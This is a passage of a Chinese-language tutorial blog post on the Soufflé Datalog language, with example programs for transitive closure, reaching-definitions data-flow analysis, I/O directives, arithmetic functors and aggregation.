和规则 A(i + 1) :- A(i)，没有额外的约束</li><li>这导致 Soufflé 尝试输出无限数量的关系 A(n)，其中 n &gt;&#x3D; 0</li><li>这在某种程度上类似于 C 等命令式编程语言中的无限 while 循环。但是，算术函子提供的表达能力增强非常方便编程。</li></ul><h3 id="传递闭包"><a href="#传递闭包" class="headerlink" title="传递闭包"></a>传递闭包</h3><p>集合 X 上的关系 R 是可传递的，如果对于 X 中的所有 x、y、z，当 <code>x R y</code> 且 <code>y R z</code> 则 <code>x R z</code>。下面的示例表示有向图，其中边定义关系，如果元组满足以下两个规则中的任何一个，则元组处于传递闭包（可达关系）中。</p><ul><li>实际上，edge 中的所有元素都是可达的（根据基本规则），归纳规则捕获了传递属性，包括像 <code>reachable(&quot;a&quot;, &quot;d&quot;)</code> 这样的元组。</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(n: symbol, m: symbol)</span><br><span class="line">edge(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="comment">/* facts of edge */</span></span><br><span class="line">edge(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;b&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl reachable (n: symbol, m: symbol)</span><br><span class="line"></span><br><span class="line">.output reachable // output relation reachable</span><br><span class="line"></span><br><span class="line">reachable(x, y):- edge(x, y). // base rule</span><br><span class="line">reachable(x, z):- edge(x, y), reachable(y, z). // inductive rule</span><br></pre></td></tr></table></figure><h3 id="同代"><a href="#同代" class="headerlink" title="同代"></a>同代</h3><p>给定一棵树（具有特定根节点的有向无环图），目标是找到哪些节点处于同一级别。</p><ul><li>下图中节点 b 和 c 处于同一级别，节点 e 和 g 也处于同一级别。</li></ul><p><img src="https://souffle-lang.github.io/img/same_generation_graph.jpg"></p><p>定义 Parent 关系，然后描述这棵树；定义 Person 关系和 SameGeneration 关系</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Parent</span>(n: symbol, m: symbol)  // 子代，父代</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;f&quot;</span>,<span class="string">&quot;c&quot;</span>).</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;c&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;a&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Person</span>(n: symbol)</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(x, <span class="symbol">_</span>).  // 子代</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(<span class="symbol">_</span>, x).  // 父代</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">SameGeneration</span> (n: symbol, m: symbol)</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, x):- <span class="symbol">Person</span>(x).   // 自己和自己是同代</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, y):- <span class="symbol">Parent</span>(x,p), <span class="symbol">SameGeneration</span>(p,q), <span class="symbol">Parent</span>(y,q).   // 父代相等时，子代是同代</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">SameGeneration</span></span><br></pre></td></tr></table></figure><h3 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h3><p>数据流分析（Data-flow analysis, DFA）旨在确定程序的静态属性，基于控制流图（Call Flow Graphs, CFG），根据节点和图的属性进行程序分析。</p><p>一个例子是可达性定义（reaching definition）：变量的定义是否到达程序中特定的点。因为变量的赋值可以直接影响程序中另一点的值，这里考虑变量 v 的明确定义 d：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d: v = &lt;expression&gt;;</span><br></pre></td></tr></table></figure><p>如果从 d 到 u 的所有路径都不包含 v 的任何明确定义，则变量 v 的定义 d 被认为可到达语句 u。注意即使没有明确的定义，函数也可能对变量产生副作用。</p><p>考虑以下控制流图，包含变量 v 的明确定义 d1 和 d2，只有 d2 定义的 v 能达到 B3。</p><p><img src="https://souffle-lang.github.io/img/reaching_definition.jpg"></p><p>以下代码输出 CFG 的所有阶段，其中 v 可能被这些定义之一捕获。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// define control flow graph</span><br><span class="line">// via the <span class="symbol">Edge</span> relation</span><br><span class="line">.decl <span class="symbol">Edge</span>(n: symbol, m: symbol)    // 边 n -&gt; m</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;start&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b2&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b3&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b3&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;end&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Generating</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">GenDef</span>(n: symbol, d:symbol)   // 生成定义 n -&gt; d</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Killing</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">KillDef</span>(n: symbol, d:symbol)  // 销毁定义 n -&gt; d</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Reachable</span></span><br><span class="line">.decl <span class="symbol">Reachable</span>(n: symbol, d:symbol)    // 可达定义</span><br><span class="line"><span class="symbol">Reachable</span>(u,d) :- <span class="symbol">GenDef</span>(u,d).  //生成点必定可达</span><br><span class="line"><span class="symbol">Reachable</span>(v,d) :- <span class="symbol">Edge</span>(u,v), <span class="symbol">Reachable</span>(u,d), !<span class="symbol">KillDef</span>(u,d). // 边uv，u 点可达且没有销毁定义 d，则 d 可达 v</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Reachable</span></span><br></pre></td></tr></table></figure><h3 id="关于输入和-C-预处理器的备注"><a href="#关于输入和-C-预处理器的备注" class="headerlink" title="关于输入和 C 预处理器的备注"></a>关于输入和 C 预处理器的备注</h3><p>与 C++ 一样，Soufflé 使用两种类型的注释：</p><ul><li>类型 1：<code>// 这是备注</code></li><li>类型 2：<code>/* 这也是备注 */</code></li></ul><p>C 预处理器处理来自 Soufflé 的输入（即可以使用宏），例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;myprog.dl&quot;</span><br><span class="line">#define MYPLUS(a,b) (a+b)</span><br></pre></td></tr></table></figure><h2 id="例2：关系"><a href="#例2：关系" class="headerlink" title="例2：关系"></a>例2：关系</h2><h3 id="关系定义"><a href="#关系定义" class="headerlink" title="关系定义"></a>关系定义</h3><p>关系必须声明后才能使用，在 Soufflé 代码中编写代码行的顺序不会影响程序的正确性。使用两个字段 a 和 b 声明关系 <code>edge</code>，每个字段都是符号（字符串）。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(a:symbol, b:symbol)</span><br></pre></td></tr></table></figure><h3 id="I-x2F-O-指令"><a href="#I-x2F-O-指令" class="headerlink" title="I&#x2F;O 指令"></a>I&#x2F;O 指令</h3><p>用户可以指定用于加载输入和将输出写入文件的指令：</p><ul><li>输入指令 <code>.input &lt;relation-name&gt;</code> 从 <code>&lt;relation-name&gt;.facts</code> 读取，默认情况下由制表符分隔</li><li>输出指令 <code>.output &lt;relation-name&gt;</code> 写入文件，通常是 <code>&lt;relation-name&gt;.csv</code>（默认）或 stdout（取决于选项）</li><li>打印关系大小指令 <code>.printsize &lt;relation-name&gt;</code> 将给定关系的基数（cardinality）打印到标准输出。</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: symbol)</span><br><span class="line">.input <span class="symbol">A</span> // facts are read from file <span class="symbol">A</span>.facts</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(n: symbol)</span><br><span class="line"><span class="symbol">B</span>(n) :- <span class="symbol">A</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">C</span>(n: symbol)</span><br><span class="line">.output <span class="symbol">C</span> // output appears in <span class="symbol">C</span>.csv</span><br><span class="line"><span class="symbol">C</span>(n) :- <span class="symbol">B</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">D</span>(n: symbol)</span><br><span class="line">.printsize <span class="symbol">D</span> // the number of facts in <span class="symbol">D</span> is printed</span><br><span class="line"><span class="symbol">D</span>(n) :- <span class="symbol">C</span>(n).</span><br></pre></td></tr></table></figure><p>关系可以从以下文件加载或写入以下文件：</p><ul><li>任意 CSV 文件</li><li>压缩的文本文件</li><li>SQLite3 数据库</li></ul><p>例如，要将评估后的关系存储到 SQLite3 数据库中，用户可以指定如下内容：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(a:number, b:number)</span><br><span class="line">.output <span class="symbol">A</span>(<span class="symbol">IO</span>=sqlite, dbname=<span class="string">&quot;path/to/sqlite3db&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>Datalog 中的目标是形式为 <code>false &lt;= p</code> 的逻辑关系，其中 <code>p</code> 是逻辑关系。在 Soufflé 中目标是由输出指令模拟的，优点是可以在一次 Soufflé 程序的执行中评估多个独立的目标。</p><h3 id="语法便利"><a href="#语法便利" class="headerlink" title="语法便利"></a>语法便利</h3><p>可以编写具有多个头的规则，这是一种语法糖，可以最大限度地减少编码工作。下面是一个利用此功能的代码片段以及未应用转换的等效代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Multiple</span> heads</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x), <span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).     // 同时定义</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br><span class="line"></span><br><span class="line">// <span class="symbol">Single</span> head</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br></pre></td></tr></table></figure><p>类似地，规则体中的析取（disjunctions）也可以作为语法糖，例如：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Disjunction</span> in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :-</span><br><span class="line">  edge(x,y);        // 或</span><br><span class="line">  edge(x,q), path(q,y).</span><br><span class="line">.output path</span><br><span class="line"></span><br><span class="line">// <span class="symbol">No</span> disjunction in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :- edge(x,y).</span><br><span class="line">path(x,y) :- edge(x,q), path(q,y).</span><br></pre></td></tr></table></figure><h2 id="例3：属性的类型系统"><a href="#例3：属性的类型系统" class="headerlink" title="例3：属性的类型系统"></a>例3：属性的类型系统</h2><p>Soufflé 的类型系统是静态的，就像 C 之类的语言一样，而与 Python 之类的语言不同。必须在编译（或解释）之前定义关系的属性，并在编译时检查类型。让程序员清楚地了解关系的定义及其用法，在运行时不进行动态检查能够最大限度地减少评估时间。</p><h3 id="原子类型"><a href="#原子类型" class="headerlink" title="原子类型"></a>原子类型</h3><p>Soufflé 有两种基本类型，符号类型 <code>symbol</code> 和数字类型 <code>number</code>。符号类型包含所有字符串，在内部由一个序数（ordinal number）表示。值 <code>ord(&quot;hello&quot;)</code> 对应于给定程序的这个序数，在这种情况下是字符串 “hello”。数字类型包括所有数字的全域。</p><h2 id="例4：算术表达式"><a href="#例4：算术表达式" class="headerlink" title="例4：算术表达式"></a>例4：算术表达式</h2><p>Soufflé 允许算术函子，扩展了传统的 Datalog 语义，函子中的变量可能不包含任何自由变量。一个简单的例子，最后一行连接中的第二个条件调用了算术运算符 <code>&lt;</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br><span class="line"><span class="symbol">A</span>(x+<span class="number">1</span>) :- <span class="symbol">A</span>(x), x &lt; <span class="number">9.</span>  // 当 x 小于 <span class="number">9</span> 时</span><br></pre></td></tr></table></figure><p>打印斐波那契数列：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Fib</span>(i:number, a:number)</span><br><span class="line">.output <span class="symbol">Fib</span></span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">1</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">2</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(i + <span class="number">1</span>, a + b) :- <span class="symbol">Fib</span>(i, a), <span class="symbol">Fib</span>(i<span class="number">-1</span>, b), i &lt; <span class="number">10.</span></span><br></pre></td></tr></table></figure><p>Soufflé 中允许使用以下算术函子：</p><ul><li>加法：<code>x + y</code></li><li>减法：<code>x - y</code></li><li>除法：<code>x / y</code></li><li>乘法：<code>x * y</code></li><li>模数：<code>a % b</code></li><li>幂：<code>a ^ b</code></li><li>计数器：<code>autoinc()</code></li><li>位操作：<code>x band y</code>、<code>x bor y</code>、<code>x bxor y</code> 和 <code>bnot x</code></li><li>逻辑运算：<code>x land y</code>、<code>x lor y</code> 和 <code>lnot x</code></li></ul><p>Soufflé 中允许以下算术约束：</p><ul><li>小于：<code>a &lt; b</code></li><li>小于或等于：<code>a &lt;= b</code></li><li>等于：<code>a = b</code></li><li>不等于：<code>a != b</code></li><li>大于或等于：<code>a &gt;= b</code></li><li>大于：<code>a &gt; b</code></li></ul><p>在源码中，数字可以写成十进制、二进制和十六进制：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">4711</span>).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span>b101).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0xaffe</span>).</span><br></pre></td></tr></table></figure><h3 id="数字编码"><a href="#数字编码" class="headerlink" title="数字编码"></a>数字编码</h3><p>数字可以用作逻辑值，如在 C 中：</p><ul><li><code>0</code> 代表假</li><li><code>!= 0</code> 代表真</li></ul><p>因此，它们可用于逻辑运算 <code>xland y</code>、<code>x lor y</code> 和 <code>lnot x</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span> lor <span class="number">1</span>).</span><br></pre></td></tr></table></figure><h3 id="函子-autoinc"><a href="#函子-autoinc" class="headerlink" title="函子 autoinc()"></a>函子 autoinc()</h3><p>函子 <code>autoinc()</code> 在每次求值时都会产生一个新数字，但是不允许在递归关系中使用。可用于为符号创建唯一编号（充当标识符），例如：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x: symbol)</span><br><span class="line"><span class="symbol">A</span>(“a”). <span class="symbol">A</span>(“b”). <span class="symbol">A</span>(“c”). <span class="symbol">A</span>(“d”).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x: symbol, y: number)</span><br><span class="line">.output <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x, autoinc()) :- <span class="symbol">A</span>(x).    // 为 a、b、c、d 各生成一个标识符</span><br></pre></td></tr></table></figure><p>给定一个集合 <code>A(x:symbol)</code>，创建一个后继关系 <code>Succ(x:symbol, y:symbol)</code> 使得第一个参数包含 A 中的元素 x，第二个参数包含 x 的后继，这也是一个 A 的元素。<br>例如，集合 <code>A = &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;&#125;</code> 具有后继关系 <code>Succ=((&quot;a&quot;, &quot;b&quot;), (&quot;b&quot;, &quot;c&quot;), (&quot;c&quot;, &quot;d&quot;)&#125;</code>。假设一个元素（在这种情况下是一个符号）的总顺序根据它的序数计算，内部表示为一个数字。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:symbol) input         // 集合</span><br><span class="line">.decl <span class="symbol">Less</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Less</span>(x,y) :- <span class="symbol">A</span>(x), <span class="symbol">A</span>(y), ord(x) &lt; ord(y).   // 排序关系：x &lt; y</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Transitive</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Transitive</span>(x,z) :- <span class="symbol">Less</span>(x,y), <span class="symbol">Less</span>(y,z).    // 传递关系：x &lt; y &amp;&amp; y &lt; z =&gt; (x, z)</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Succ</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Succ</span>(x,y) :- <span class="symbol">Less</span>(x,y), !<span class="symbol">Transitive</span>(x,y).   // 后继关系：x &lt; y &amp;&amp; 不存在传递关系</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Less</span>, <span class="symbol">Transitive</span>, <span class="symbol">Succ</span></span><br></pre></td></tr></table></figure><p>计算后继关系的第一个和最后一个元素。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">First</span>(x: symbol) output</span><br><span class="line"><span class="symbol">First</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(<span class="symbol">_</span>, x).  // 没有前驱</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Last</span>(x: symbol) output</span><br><span class="line"><span class="symbol">Last</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(x, <span class="symbol">_</span>).   // 没有后继</span><br></pre></td></tr></table></figure><h2 id="例5：聚合"><a href="#例5：聚合" class="headerlink" title="例5：聚合"></a>例5：聚合</h2><p>Soufflé 中的聚合是指使用特定的函子来汇总有关查询的信息，聚合类型包括计数、求最小值&#x2F;最大值、求和。在 Soufflé 中，信息通常不能从子目标（聚合函子的参数）流到外部作用域。例如，如果希望找到关系 Cost(x) 的最小值，无法找到使成本最小化的特定 x 值，因为这样的 x 值可能不是唯一的。</p><h3 id="计数"><a href="#计数" class="headerlink" title="计数"></a>计数</h3><p>计数函子用于计算子目标的集合大小，语法为 <code>count:&#123;&lt;sub-goal&gt;&#125;</code>。</p><p>以下示例输出“蓝色”汽车的数量，即 Car 中第二个参数为“蓝色”的元素数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Car</span>(name: symbol, colour:symbol)</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;Audi&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;VW&quot;</span>, <span class="string">&quot;red&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;BMW&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">BlueCarCount</span>(x: number)</span><br><span class="line"><span class="symbol">BlueCarCount</span>(c) :- c = count:&#123;<span class="symbol">Car</span>(<span class="symbol">_</span>, <span class="string">&quot;blue&quot;</span>)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">BlueCarCount</span></span><br></pre></td></tr></table></figure><h3 id="最大值-x2F-最小值-x2F-求和"><a href="#最大值-x2F-最小值-x2F-求和" class="headerlink" title="最大值&#x2F;最小值&#x2F;求和"></a>最大值&#x2F;最小值&#x2F;求和</h3><p>max 函子输出集合的最大值，语法为 <code>max &lt;var&gt;:&#123;&lt;sub-goal(&lt;var&gt;)&gt;&#125;</code>。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">10</span>). <span class="symbol">A</span>(<span class="number">100</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">MaxA</span>(x: number)</span><br><span class="line"><span class="symbol">MaxA</span>(y) :- y = max x:&#123;<span class="symbol">A</span>(x)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">MaxA</span></span><br></pre></td></tr></table></figure><p>最小值语法为 <code>min &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>；求和语法为 <code>sum &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>。</p><h1 id="Souffle-程序"><a href="#Souffle-程序" class="headerlink" title="Soufflé 程序"></a>Soufflé 程序</h1><p>主要整理 Doop 中用到的一些内容，包括基本的关系、类型、规则，以及进阶的自定义函子、组件、编译指令。（这不是全包含了吗😅）</p><ul><li>语言（Language）</li><li>关系（Relations）</li><li>类型（Types）</li><li>规则（Rules）</li><li>组件（Components）</li><li>用户定义函子（User-Defined Functors）</li><li>编译指令（Pragma）</li></ul><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><h3 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h3><p>Soufflé 中的主要语言元素是关系声明（relation declarations）、事实（facts）、规则（rules）和指令（directives）。</p><p>例如，以下程序中包含两个关系 A 和 B，关系必须声明（以便编译时检查属性的使用）；关系 A 有两个事实：<code>A(1,2).</code> 和 <code>A(2,3).</code>，事实是无条件成立的规则，即事实是 Horn Clause <code>A(1,2) ⇐ true</code>；关系 B 有两个规则：<code>B(x,y) :- A(x,y).</code> 和 <code>B(x,z) :- A(x,y), B(y,z).</code>，表示 Horn Clause <code>B(x,y) ⇐ A(x,y)</code> 和 <code>B(x,y) ⇐ A(x,y), B(y,z)</code>。</p><ul><li>Horn Clause 的解释可以看：<a href="http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html">http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html</a></li></ul><p>最后的指令 <code>.output B</code> 表示在执行结束时查询关系 B，并将其写入文件或打印到屏幕中。关系声明、事实、规则和指令的顺序可以是任意的，并不影响最终的执行。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number)  // declaration of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>,<span class="number">2</span>).                      // facts of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x:number, y:number)  // declaration of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,y) :- <span class="symbol">A</span>(x,y).            // rules of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,z) :- <span 